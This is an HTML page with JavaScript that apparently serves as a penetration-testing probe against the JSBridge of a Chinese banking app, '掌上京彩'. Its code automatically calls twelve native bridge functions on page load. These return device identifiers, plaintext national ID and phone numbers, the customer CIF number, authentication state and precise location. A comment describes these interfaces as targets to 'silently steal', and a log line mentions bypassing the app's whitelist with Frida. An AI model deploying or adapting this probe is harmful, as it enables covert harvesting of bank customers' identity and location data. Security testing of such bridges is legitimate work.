<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>JSBridge 自动化数据截获监控</title>
    <style>
        * { box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            padding: 15px; 
            background: #111; 
            margin: 0;
            color: #eee;
        }
        h2 { text-align: center; font-size: 18px; margin-bottom: 20px; color: #fff; }
        
        .card {
            background: #1e1e1e;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 12px;
            margin-bottom: 12px;
        }
        
        .card-header {
            font-size: 14px;
            font-weight: bold;
            color: #d02b34;
            margin-bottom: 8px;
            border-bottom: 1px dashed #444;
            padding-bottom: 6px;
        }
        
        .result-box {
            font-family: monospace;
            font-size: 13px;
            color: #00ff00;
            min-height: 20px;
            white-space: pre-wrap;
            word-break: break-all;
        }
        
        #miniLog {
            margin-top: 20px;
            background: #000;
            color: #888;
            padding: 10px;
            border-radius: 6px;
            height: 100px;
            overflow-y: scroll;
            font-size: 11px;
            border: 1px solid #333;
        }
    </style>
</head>
<body>
    <h2>⚡ 掌上京彩 API 自动化嗅探 ⚡</h2>
    
    <div id="container">
        <!-- 自动构建的数据桩会被插入到这里 -->
    </div>

    <div id="miniLog">系统初始化中...<br></div>

    <script>
        // 定义我们要试图静默窃取/提取的数据接口
        const targetApis = [
            { id: "thirdGetMobileInfo", name: "设备与网络信息(MAC/IMEI/IP)" },
            { id: "thirdGetAppVersion", name: "应用版本号" },
            { id: "thirdGetUserIdCardNum", name: "身份证明文(IdCard)" },
            { id: "thirdGetUserIdCardMd5Num", name: "身份证MD5" },
            { id: "thirdGetUserCif", name: "客户核心编号(CIF)" },
            { id: "thirdGetUserPhotoNumber", name: "手机号明文(Phone)" },
            { id: "thirdGetUserPhotoMd5Number", name: "手机号MD5" },
            { id: "thirdGetIsLogin", name: "当前登录态(Boolean)" },
            { id: "thirdGetIsAuthentication", name: "实名认证状态" },
            { id: "thirdGetLocation", name: "粗略定位/GPS状态" },
            { id: "thirdGetUserLongitudeAndLatitude", name: "精确经纬度" },
            { id: "thirdGetUserProvinceAndCity", name: "当前省市中文名" }
        ];

        function logMsg(msg, isError = false) {
            const logDiv = document.getElementById('miniLog');
            const color = isError ? '#ff4d4f' : '#888';
            logDiv.innerHTML += `<div style="color:${color};">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            logDiv.scrollTop = logDiv.scrollHeight;
        }

        // 初始化网页 UI 动态构建对应的空槽位
        function initUI() {
            const container = document.getElementById('container');
            targetApis.forEach(api => {
                container.innerHTML += `
                    <div class="card">
                        <div class="card-header">${api.name} (${api.id})</div>
                        <div class="result-box" id="res-${api.id}">
                            <span style="color:#888;">⏳ 准备请求中...</span>
                        </div>
                    </div>
                `;
            });
        }

        // 核心执行逻辑：遍历并自动触发 API
        function startAutoFetch() {
            logMsg("启动自动化遍历探测...");
            const bridge = window.TMFJSBridge || window.JSBridge || window.WebViewJavascriptBridge;

            if (!bridge) {
                logMsg("警告：未发现规范的 TMFJSBridge 注入容器！如果接下来数据全是未找到，请检查白名单是否被你的 Frida Bypass！", true);
            }

            // 循环无阻塞地发起所有请求
            targetApis.forEach(api => {
                const resBox = document.getElementById(`res-${api.id}`);
                
                if (bridge && typeof bridge.invoke === 'function') {
                    resBox.innerHTML = '<span style="color:#e6a23c;">📡 正在向底层发送截获请求...</span>';
                    try {
                        bridge.invoke(api.id, {}, function(response) {
                            try {
                                const jsonStr = typeof response === 'object' ? JSON.stringify(response, null, 2) : response;
                                resBox.innerHTML = jsonStr;
                            } catch(err) {
                                resBox.innerHTML = response;
                            }
                        });
                    } catch (e) {
                        resBox.innerHTML = `<span style="color:#ff4d4f;">运行时调用崩溃: ${e.message}</span>`;
                    }
                } else if (window[api.id]) {
                    // 兼容平铺在 window 下的情况
                    try {
                        let res = window[api.id]();
                        const jsonStr = typeof res === 'object' ? JSON.stringify(res, null, 2) : res;
                        resBox.innerHTML = jsonStr;
                    } catch(e) {
                         resBox.innerHTML = `<span style="color:#ff4d4f;">底层拒绝执行: ${e.message}</span>`;
                    }
                } else {
                    resBox.innerHTML = '<span style="color:#ff4d4f;">❌ 接口环境缺失/权限限制</span>';
                }
            });
        }

        /* 
         * 入口逻辑 
         * 为了应对不同的 Android webview 初始化延迟
         */
        window.onload = function() {
            initUI();
            
            // 策略 1：如果是同步诸入，我们直接跑一遍
            setTimeout(() => {
                const bridge = window.TMFJSBridge || window.JSBridge || window.WebViewJavascriptBridge;
                if(bridge || window['thirdGetMobileInfo']) {
                    logMsg("探测到环境，启动同步触发...");
                    startAutoFetch();
                } else {
                    logMsg("窗口已加载但安全框架尚未 Ready，等待事件...");
                }
            }, 800);
            
            // 策略 2：通过 TMF 框架暴露的异步专用事件触发
            document.addEventListener('TMFJSBridgeReady', function() {
                logMsg('✅ 收到原生层抛出的 TMFJSBridgeReady 信号，启动异步触发...');
                startAutoFetch();
            }, false);
            
            // 策略预备：老版本的 AlipayJSBridge 生命周期
            document.addEventListener('AlipayJSBridgeReady', function () {
                logMsg('✅ 收到阿里体系的 JSBridgeReady 信号...');
                startAutoFetch();
            }, false);
        };
    </script>
</body>
</html>
